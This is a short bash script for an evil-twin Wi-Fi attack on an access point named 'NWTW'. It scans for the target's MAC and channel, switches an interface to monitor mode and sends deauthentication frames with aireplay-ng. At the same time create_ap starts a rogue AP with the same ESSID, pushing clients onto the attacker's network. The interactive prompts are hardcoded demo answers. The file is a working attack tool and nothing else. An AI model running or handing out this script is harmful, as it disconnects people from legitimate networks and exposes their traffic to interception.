#!/bin/bash
echo "Enter interface for monitoring/injection"
sleep 1s
echo "wlxf81a6709dba3"
sleep 1s
interface_deauth="wlxf81a6709dba3"

echo "Enter interface for rogue AP"
sleep 1s
echo "wlx7cdd90735c6a"
sleep 1s
interface_ap="wlx7cdd90735c6a"

echo "Enter faceing interface"
sleep 1s
echo "wlp4s0"
sleep 1s
interface_faceing="wlp4s0"

#iwlist wlp4s0 scan | grep "ESSID"

echo "Enter the ESSID of the target AP"
sleep 1s
echo "NWTW"
sleep 1s
essid="NWTW"

array=( $(sudo iwlist wlp4s0 scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )
count=0
echo "Do you really want to attack ${essid} Yes/No ?"
sleep 1s
echo "Yes"
sleep 1s
response="Yes"
if [ $response = Yes ]
then
	echo "Attack launched"
	sleep 1s
	ifconfig ${interface_deauth} down
        iwconfig ${interface_deauth} mode monitor
	ifconfig ${interface_deauth} up
	for i in "${array[@]}"
	do
		if [ $(($count%8)) -eq 4 ]
		then
			address=$i
		fi
		if [ $(($count%8)) -eq 5 ]
		then
			channel="${i//[!0-9]/}"
			#echo "Channel ${channel} and MAC ${address}"
			iwconfig ${interface_deauth} channel ${channel}
			(sleep 7s; aireplay-ng -0 15 -a ${address} ${interface_deauth}) &
			create_ap ${interface_ap} ${interface_faceing} ${essid}
		fi
		((++count))
	done
fi



